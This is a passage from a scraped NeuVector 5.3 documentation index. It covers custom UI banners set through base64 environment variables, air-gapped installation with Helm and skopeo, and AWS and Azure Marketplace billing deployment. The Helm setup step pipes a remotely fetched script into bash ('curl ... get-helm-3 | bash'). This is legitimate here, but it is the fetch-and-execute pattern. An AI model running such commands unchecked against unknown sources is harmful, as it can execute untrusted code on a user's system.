zKhWipZT3mD9yEwsqw7Gr48OFRveWrUyk83Kx2hBhWTA3Lf2q8I4nQsJ7n6pZYxNsWN+GnrXI76G2EoYgNi4A5/aseb2VYBMoq9dhQgpm9xFX9xK1h+RDDip1hdRb4Y83BH/+RUEJMMV7pmYCTuFpIEE9nxiISN+GnrXI76G2EoRxuwo95v5CQpR6/1hqIedYcD8MKuAREBzGboL/DZweZCvI/xut2Dg1i8ODBd6HcajvaFKqH3A5BEARBEARBEARBEARBEARBEARBEARBEARBEARBEARBEARBEARBEDqAhIT/ByWbSc1AOz7RAAAAAElFTkSuQmCC"/>
  </svg>

 restartPolicy: Always   Apply the changes:  kubectl apply -f neuvector-containerd-k8s.yaml   This will apply the customization changes to the UI pages.  ","version":"5.3","tagName":"h3"},{"title":"Verification​","type":1,"pageTitle":"Custom Login, Header and Footer","url":"/configuration/customui#verification-1","content":" To verify that the environment variables have been successfully set, you can run the following command:  kubectl get deployment -n neuvector neuvector-manager-pod -o yaml   Check the spec.template.spec.containers.env section to ensure that the desired environment variables are present.  spec: progressDeadlineSeconds: 600 replicas: 1 revisionHistoryLimit: 10 selector: matchLabels: app: neuvector-manager-pod strategy: rollingUpdate: maxSurge: 25% maxUnavailable: 25% type: RollingUpdate template: metadata: creationTimestamp: null labels: app: neuvector-manager-pod release: neuvector spec: containers: - env: - name: CTRL_SERVER_IP value: neuvector-svc-controller.neuvector - name: CUSTOM_PAGE_HEADER_COLOR value: '#ff8c00' - name: CUSTOM_PAGE_HEADER_CONTENT value: WW91IGFyZSBhY2Nlc3NpbmcgYSAmbmJzcDs8Yj4gVS5TLiBHb3Zlcm5tZW50IChVU0cpIEluZm9ybWF0aW9uIFN5c3RlbSAoSVMpIDwvYj4gICAgICB0aGF0IGlzIHByb3ZpZGVkIGZvciBVU0ctYXV0aG9yaXplZCB1c2Ugb25seS4= - name: CUSTOM_EULA_POLICY value: PGg0PgogIFlvdSBhcmUgYWNjZXNzaW5nIGEgVS5TLiBHb3Zlcm5tZW50IChVU0cpIEluZm9ybWF0aW9uIFN5c3RlbSAoSVMpIHRoYXQgaXMgcHJvdmlkZWQgZm9yIFVTRy1hdXRob3JpemVkIHVzZSBvbmx5LgpCeSB1c2luZyB0aGlzIElTICh3aGljaCBpbmNsdWRlcyBhbnkgZGV2aWNlIGF0dGFjaGVkIHRvIHRoaXMgSVMpLCB5b3UgY29uc2VudCB0byB0aGUgZm9sbG93aW5nIGNvbmRpdGlvbnM6CjwvaDQ+CjxwPgotVGhlIFVTRyByb3V0aW5lbHkgaW50ZXJjZXB0cyBhbmQgbW9uaXRvcnMgY29tbXVuaWNhdGlvbnMgb24gdGhpcyBJUyBmb3IgcHVycG9zZXMgaW5jbHVkaW5nLCBidXQgbm90IGxpbWl0ZWQgdG8sIHBlbmV0cmF0aW9uIHRlc3RpbmcsIENPTVNFQyBtb25pdG9yaW5nLCBuZXR3b3JrIG9wZXJhdGlvbnMgYW5kIGRlZmVuc2UsIHBlcnNvbm5lbCBtaXNjb25kdWN0IChQTSksIGxhdyBlbmZvcmNlbWVudCAoTEUpLCBhbmQgY291bnRlcmludGVsbGlnZW5jZSAoQ0kpIGludmVzdGlnYXRpb25zLgo8L3A+CjxwPgotQXQgYW55IHRpbWUsIHRoZSBVU0cgbWF5IGluc3BlY3QgYW5kIHNlaXplIGRhdGEgc3RvcmVkIG9uIHRoaXMgSVMuCjwvcD4K - name: CUSTOM_LOGIN_LOGO value: <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="80" xml:space="preserve" version="1.1" viewBox="0 0 300 80">
    <image width="300" height="80" xlink:href="data:image/png;base64,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"/>
  </svg>

   Console/UI pages after customization:​  Please note that the example is for demonstration purposes only. Make sure to adjust the values according to your needs.   ","version":"5.3","tagName":"h3"},{"title":"Air Gapping NeuVector","type":0,"sectionRef":"#","url":"/deploying/airgap","content":"","keywords":"","version":"5.3"},{"title":"Tools Needed​","type":1,"pageTitle":"Air Gapping NeuVector","url":"/deploying/airgap#tools-needed","content":" We need to install three tools for downloading all the bits for Neuvector.  Helm - Application Lifecycle ManagerSkopeo - Image/Registry ToolZStandard - Compresstion Algorithm  # install helm curl -fsSL https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash # install skopeo - rocky linux based yum install zstd skopeo -y   ","version":"5.3","tagName":"h3"},{"title":"Get Images and Chart​","type":1,"pageTitle":"Air Gapping NeuVector","url":"/deploying/airgap#get-images-and-chart","content":" In order to get all the images we are going to use the chart itself. Using Helm let's add the repo and download the chart. We will also use skopeo for downloading and uploading.  # make a directory mkdir -p neuvector/images # add repo helm repo add neuvector https://neuvector.github.io/neuvector-helm/ # update local chart helm repo update # pull helm pull neuvector/core -d neuvector   You should now see a file like core-2.4.0.tgz. The version may vary, but this is correct. This is the downloaded chart. Now we need the images. Good thing we can use the chart to figure this out.  # create image list helm template neuvector/core-*.tgz | awk '$1 ~ /image:/ {print $2}' | sed -e 's/\\&quot;//g' &gt; neuvector/images/list.txt # get images for i in $(cat neuvector/images/list.txt); do skopeo copy docker://$i docker-archive:neuvector/images/$(echo $i| awk -F/ '{print $3}'|sed 's/:/_/g').tar:$(echo $i| awk -F/ '{print $3}') done   Fantastic, we should have a directory that looks like:  [root@flux ~]# ls -lR neuvector neuvector: total 16 -rw-r--r--. 1 root root 15892 Jan 8 14:33 core-2.4.0.tgz drwxr-xr-x. 2 root root 153 Jan 8 14:35 images neuvector/images: total 953920 -rw-r--r--. 1 root root 236693504 Jan 8 14:35 controller_5.3.2.tar -rw-r--r--. 1 root root 226704384 Jan 8 14:35 enforcer_5.3.2.tar -rw-r--r--. 1 root root 176 Jan 8 14:34 list.txt -rw-r--r--. 1 root root 331550208 Jan 8 14:35 manager_5.3.2.tar -rw-r--r--. 1 root root 169589760 Jan 8 14:35 scanner_latest.tar -rw-r--r--. 1 root root 12265472 Jan 8 14:35 updater_latest.tar   And we can compress and move everything.  ","version":"5.3","tagName":"h3"},{"title":"Compress and Move​","type":1,"pageTitle":"Air Gapping NeuVector","url":"/deploying/airgap#compress-and-move","content":" Compressing is fairly simple. We will use tar with the ZST format for maximum compression.  # compress tar -I zstd -vcf neuvector_airgap.zst neuvector   Now simply move the 400M neuvector_airgap.zst to your network.  ","version":"5.3","tagName":"h3"},{"title":"Uncompress and Load​","type":1,"pageTitle":"Air Gapping NeuVector","url":"/deploying/airgap#uncompress-and-load","content":" All we need to do now is uncompress with a similar command. The following will output to director called neuvector.  tar -I zstd -vxf neuvector_airgap.zst   Loading the images into a registry is going to require an understanding of your internal network. For this doc let's use &quot;registry.awesome.sauce&quot; as the DNS name. Loading the images is fairly simple again with skopeo. Please make sure it is installed on the &quot;inside&quot; machine. You will probably need to authenticate with skopeo login for it to work.  # skopeo load export REGISTRY=registry.awesome.sauce for file in $(ls neuvector/images | grep -v txt ); do skopeo copy docker-archive:neuvector/images/$file docker://$(echo $file | sed 's/.tar//g' | awk -F_ '{print &quot;'$REGISTRY'/neuvector/&quot;$1&quot;:&quot;$2}') done   With all the images loaded in a registry we can install with Helm.  ","version":"5.3","tagName":"h3"},{"title":"Deploy with Helm​","type":1,"pageTitle":"Air Gapping NeuVector","url":"/deploying/airgap#deploy-with-helm","content":" Deploying with Helm is fairly straight forward. There are a few values that are needed to insure the images are pulling from the local registry. Here is a good example. You may need to tweak a few settings. Please follow the Helm best practices for values.yaml. Note the imagePullSecrets field. This is the secret for your cluster to authenticate to the registry.  # helm install example # variables export REGISTRY=registry.awesome.sauce # registry URL export NEU_URL=neuvector.awesome.sauce # neuvector URL # helm all the things -- read all the options being set helm upgrade -i neuvector --namespace neuvector neuvector/core --create-namespace --set imagePullSecrets=regsecret --set k3s.enabled=true --set k3s.runtimePath=/run/k3s/containerd/containerd.sock --set manager.ingress.enabled=true --set controller.pvc.enabled=true --set controller.pvc.capacity=10Gi --set manager.svc.type=ClusterIP --set registry=$REGISTRY --set tag=5.3.2 --set controller.image.repository=neuvector/controller --set enforcer.image.repository=neuvector/enforcer --set manager.image.repository=neuvector/manager --set cve.updater.image.repository=neuvector/updater --set manager.ingress.host=$NEU_URL  ","version":"5.3","tagName":"h3"},{"title":"AWS Marketplace Billing","type":0,"sectionRef":"#","url":"/deploying/awsmarketplace","content":"","keywords":"","version":"5.3"},{"title":"Deploy NeuVector from AWS Marketplace Pay-As-You-Go Listing​","type":1,"pageTitle":"AWS Marketplace Billing","url":"/deploying/awsmarketplace#deploy-neuvector-from-aws-marketplace-pay-as-you-go-listing","content":" NeuVector Prime supports monthly billing through your AWS account in a Pay-As-You-Go (PAYG) billing subscription for SUSE support of NeuVector.  Usage is billed monthly based on the average number of nodes protected by NeuVector during the month. Please see the NeuVector marketplace listing for your region for specific pricing tiers and other information.  NeuVector Prime with 24x7 Support (non-EU and non-UK only)NeuVector Prime with 24x7 Support (EU and UK only)  note AWS Private Offers are available for NeuVector for special pricing situations in lieu of standard PAYG pricing.  ","version":"5.3","tagName":"h3"},{"title":"Supported Configurations​","type":1,"pageTitle":"AWS Marketplace Billing","url":"/deploying/awsmarketplace#supported-configurations","content":" The marketplace PAYG listing supports deployment on supported target environments only. As of the July release, only EKS is supported for the billing adapter (see below options for other environments such as Rancher, Kubernetes, OpenShift etc). Each cluster can report its usage (nodes) independently, or an aggregated node count for a multi-cluster deployment can be reported. An aggregated, multi-cluster deployment can take advantage of the volume discount tiers offered by pooling all nodes across clusters into a single usage billing calculation.  note All clusters in PAYG billing (single, primary, remotes) must be running NeuVector version 5.2.0 or later.  Single Cluster Usage Billing​  Each cluster onto which you have deployed the PAYG billing adapter through the marketplace will report usage information for your AWS account.  Multi-cluster Usage Billing​  To be able to aggregate the node counts from multiple clusters in order to take advantage of volume discounts, the clusters must have been configured for Multi-cluster federation as described in the NeuVector docs. NeuVector on the Primary cluster MUST have been deployed through the AWS Marketplace, with the billing adapter installed in the primary cluster, in order to be able to report the primary and all downstream remote cluster node counts. Do not deploy NeuVector through the marketplace on downstream remote clusters. Use standard deployment methods (Helm, Operator, kubectl etc) described in the NeuVector docs on remote clusters.  Enabling PAYG NeuVector Prime Billing for Existing NeuVector Clusters​  There are several options to enable NeuVector Prime billing on existing NeuVector clusters.  Option 1: The existing cluster must be on a supported PAYG platform. Backup the NeuVector configuration of the existing cluster, remove the NeuVector deployment, then deploy NeuVector through the AWS marketplace. After successful deployment, import the backup configuration. Note: It is recommended that the existing cluster be running version NeuVector 5.2.0 or later before the backup and removal. For Helm based deployments, this is a sample Helm upgrade command (replacing account ID, IAM role name, previous helm version values file etc):  helm upgrade -n neuvector neuvector oci://709825985650.dkr.ecr.us-east-1.amazonaws.com/suse/neuvector-csp-billing-adapter-llc/core --version 2.4.30002023052201 --create-namespace \\ --set awsbilling.accountNumber=$AWS_ACCT_ID,awsbilling.roleName=$IAM_ROLE_NAME \\ --set awsbilling.enabled=true,containerd.enabled=true -f values-x.y.z.yaml   Option 2: Add the existing cluster as a federated remote cluster to a (existing or newly deployed) primary cluster which already has PAYG billing deployed on it. In this case, the existing cluster can be on any platform supported by NeuVector.  Enabling PAYG NeuVector Prime Billing for Rancher, OpenShift, Tanzu, or other NeuVector supported clusters​  Although PAYG billing deployment is supported on a limited set of AWS platforms (only EKS at initial July release), billing for other supported NeuVector platforms can be accomplished using the multi-cluster federation configuration. As long as the primary cluster has the PAYG billing deployment of NeuVector, downstream clusters can be any supported NeuVector clusters such as Rancher, Kubernetes, OpenShift, or Tanzu. Downstream clusters can even be on-premise, or on other clouds as long as the remote cluster can be federated to the primary (with appropriate network access).  For Rancher managed downstream clusters with SSO to NeuVector, these clusters can be federated to a non-Rancher primary cluster which is deployed through the AWS marketplace in order to benefit from consolidated multi-cluster billing.  ","version":"5.3","tagName":"h3"},{"title":"Deploying NeuVector Prime through the AWS Marketplace​","type":1,"pageTitle":"AWS Marketplace Billing","url":"/deploying/awsmarketplace#deploying-neuvector-prime-through-the-aws-marketplace","content":" A special billing interface is required to enable PAYG to your AWS account. This must be deployed, together with NeuVector from the AWS Marketplace listing for NeuVector. To deploy the billing adapter and NeuVector see the Usage instructions for your region in the marketplace listing above.  The helm install command uses defaults in the values.yaml file. Important defaults to check are the manager service type (LoadBalancer) and container run-time (containerd - which is the typical default for EKS clusters). The default admin username is disabled, and users are required to set a username and password through a secret prior to deployment.  Setting the Admin Username and Password​  It is required to set the admin username and password as a Kubernetes secret prior to deployment.  kubectl create secret generic neuvector-init --from-file=userinitcfg.yaml -n neuvector   note The above step is mandatory, otherwise an admin user will not be created upon NeuVector deployment, making the NeuVector deployment unmanageable.  Sample userinitcfg.yaml content:  users: - Fullname: admin Password: (ValidPassword) Role: admin # 8 character(s) minimum,1 uppercase character(s),1 lowercase character(s), 1 number(s).   Sample helm install command:  helm install -n neuvector neuvector --create-namespace \\ oci://709825985650.dkr.ecr.us-east-1.amazonaws.com/suse/neuvector-csp-billing-adapter-llc/core --version 2.6.1 \\ --set awsbilling.accountNumber=$AWS_ACCOUNT_ID \\ --set awsbilling.roleName=$ROLE_NAME \\ --set manager.svc.type=LoadBalancer   See the Usage instructions on the AWS marketplace listing for detailed NeuVector instructions.  Console Login through Load Balancer​  If the manager service type was set to Load Balancer during install, an external IP (URL) has been assigned for logging into the NeuVector console. Typically, this URL is accessible from the internet, but your organization may have placed additional restrictions on external access to your cluster. To see the load balancer, type:  kubectl get svc -n neuvector neuvector-service-webui   To get the full login url, type:  SERVICE_IP=$(kubectl get svc --namespace neuvector neuvector-service-webui -o jsonpath=&quot;{.status.loadBalancer.ingress[0].hostname}&quot;) echo https://$SERVICE_IP:8443   And you will see something like:  https://a2647ecdxx33498948a70eea84c5-18386345695.us-west-2.elb.amazonaws.com:8443   This is how you can access the NeuVector console from your browser on the default port 8443.  Once logged in, you can begin to navigate and configure NeuVector.  note The NeuVector scanner image is updated daily with a new CVE database on the NeuVector docker hub registry. It is recommended that the image path be changed to allow for automated daily updates by modifying the scanner and updater image paths AFTER successful initial deployment. For example: kubectl set image deploy/neuvector-scanner-pod neuvector-scanner-pod=docker.io/neuvector/scanner:latest kubectl set image cronjob/neuvector-updater-pod neuvector-updater-pod=docker.io/neuvector/updater:latest   ","version":"5.3","tagName":"h3"},{"title":"Obtaining Support​","type":1,"pageTitle":"AWS Marketplace Billing","url":"/deploying/awsmarketplace#obtaining-support","content":" Once PAYG billing is enabled for a cluster or multiple clusters, customers are eligible for support through the SUSE Support Center (SCC) service. This is a web-based service for creating, viewing, and managing support requests. The actual link for submitting your support bundle as described below can be found here.  The SCC portal will require you to upload a Support Configuration bundle in order to verify your eligibility as well as provide cluster information required to start investigations. To download the support config, please go to Settings -&gt; Configuration at the bottom of the page for the cluster in question. For multi-cluster configurations, only the Primary cluster's support config is required, even if the support inquiry is for a downstream remote cluster. If you do not have access to the Primary cluster, the remote cluster's support config is acceptable.  ","version":"5.3","tagName":"h3"},{"title":"Upgrading a NeuVector PAYG Cluster​","type":1,"pageTitle":"AWS Marketplace Billing","url":"/deploying/awsmarketplace#upgrading-a-neuvector-payg-cluster","content":" The AWS marketplace PAYG listing helm chart is tied to a specific billing adapter AND NeuVector version. These are updated periodically as new versions of the billing adapter or NeuVector are released. To update the NeuVector version to the latest version supported by the marketplace listing, use the Helm update command as normal. To update the NeuVector version to a more recent version than is specified in the marketplace listing, manually change the helm values for the images (registry, paths, version tags) to point to the desired version (e.g. docker.io, neuvector/controller:5.2.5). ","version":"5.3","tagName":"h3"},{"title":"Azure Marketplace Billing","type":0,"sectionRef":"#","url":"/deploying/azuremarketplace","content":"","keywords":"","version":"5.3"},{"title":"Deploy NeuVector from Azure Marketplace Pay-As-You-Go Listing​","type":1,"pageTitle":"Azure Marketplace Billing","url":"/deploying/azuremarketplace#deploy-neuvector-from-azure-marketplace-pay-as-you-go-listing","content":" NeuVector Prime supports monthly billing through your Azure account in a Pay-As-You-Go (PAYG) billing subscription for SUSE support of NeuVector.  Usage is billed monthly based on the average number of nodes protected by NeuVector during the month. Please see the Azure Marketplace listing for your appropriate region for specific pricing tiers and other information.  NeuVector Prime with 24x7 Support (non-EU and non-UK only)NeuVector Prime with 24x7 Support (EU and UK only)  Additional Usage Instructions can be found here.  note Azure Private Offers are available for NeuVector for special pricing situations in lieu of standard PAYG pricing.  ","version":"5.3","tagName":"h3"},{"title":"Supported Configurations​","type":1,"pageTitle":"Azure Marketplace Billing","url":"/deploying/azuremarketplace#supported-configurations","content":" The marketplace PAYG listing supports deployment on supported target environments only. As of the July release, only AKS is supported for the billing adapter (see below options for other environments such as Rancher, Kubernetes, OpenShift etc). Each cluster can report its usage (nodes) independently, or an aggregated node count for a multi-cluster deployment can be reported. An aggregated, multi-cluster deployment can take advantage of the volume discount tiers offered by pooling all nodes across clusters into a single usage billing calculation.  note All clusters in PAYG billing (single, primary, remotes) must be running NeuVector version 5.2.2 or later.  Single Cluster Usage Billing​  Each cluster onto which you have deployed the PAYG billing adapter through the marketplace will report usage information for your Azure account.  Multi-cluster Usage Billing​  To be able to aggregate the node counts from multiple clusters in order to take advantage of volume discounts, the clusters must have been configured for Multi-cluster federation as described in the NeuVector docs. NeuVector on the Primary cluster MUST have been deployed through the Azure Marketplace, with the billing adapter installed in the primary 